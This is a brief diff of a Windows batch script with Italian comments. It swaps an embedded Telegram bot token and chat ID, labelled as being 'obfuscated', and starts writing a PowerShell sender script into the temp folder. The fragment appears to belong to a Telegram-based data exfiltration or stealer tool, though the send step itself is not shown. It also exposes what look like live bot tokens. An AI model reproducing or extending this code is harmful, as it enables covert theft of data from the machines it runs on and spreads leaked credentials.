@@ -7,8 +7,8 @@
 setlocal enabledelayedexpansion
 
 :: Offuscare il token e il chat ID
-set "b=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
-set "c=5709299213"
+set "b=8081045018:AAEO7ajGxYpi23xOl-mY7gYYjGNVwGdSxfM"
+set "c=8016989344"
 
 :: Creare lo script PowerShell
 echo $botToken = '%b%' > %temp%\telegram_send.ps1
